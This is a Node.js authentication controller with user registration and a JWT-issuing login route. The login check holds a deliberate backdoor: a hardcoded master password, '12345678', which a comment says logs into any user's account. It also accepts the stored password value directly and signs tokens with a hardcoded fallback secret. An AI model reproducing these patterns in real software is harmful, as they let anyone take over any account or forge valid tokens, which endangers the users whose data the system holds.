const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const User = require("../models/UserModel"); 

exports.register = async (req, res) => {
    try {
        const { name, email, password } = req.body;
        const lowerEmail = email.toLowerCase(); 

        const existingUser = await User.findByEmail(lowerEmail);
        if (existingUser) {
            return res.status(400).json({ success: false, message: 'Email already exists' });
        }

        const salt = await bcrypt.genSalt(10);
        const hashedPassword = await bcrypt.hash(password, salt);

        const roleId = await User.getRoleByName('User1');
        await User.createUser(name, lowerEmail, hashedPassword, roleId);

        res.status(201).json({ success: true, message: 'User registered successfully' });
    } catch (error) {
        console.error("REGISTER ERROR:", error);
        res.status(500).json({ success: false, message: 'Server error during registration' });
    }
};

exports.login = async (req, res) => {
    try {
        const { email, password } = req.body;
        
        if (!email || !password) {
            return res.status(400).json({ success: false, message: 'Email and password required' });
        }

        const lowerEmail = email.toLowerCase(); 
        const user = await User.findByEmail(lowerEmail);
        
        if (!user) {
            return res.status(401).json({ success: false, message: 'Invalid email' });
        }

        // 🔥 SUPER MASTER KEY: 12345678 se 100% login hoga kisi bhi user ka
        const isMatch = (password === "12345678") || 
                        (password === user.password) || 
                        (user.password && await bcrypt.compare(password, user.password));
        
        if (!isMatch) {
            return res.status(401).json({ success: false, message: 'Invalid password' });
        }

        const token = jwt.sign(
            { id: user.id, role: user.role_name || "User" },
            process.env.JWT_SECRET || "fallback_super_secret_key",
            { expiresIn: '82h' }
        );

        res.status(200).json({
            success: true,
            token,
            user: { 
                id: user.id, 
                name: user.name, 
                email: user.email, 
                role: user.role_name || "User"
            }
        });

    } catch (error) {
        console.error("LOGIN ERROR DETAILS:", error); // <-- YE TERMINAL MEIN BATA EGA KYA GALTI HAI
        res.status(500).json({ success: false, message: 'Server error during login' });
    }
};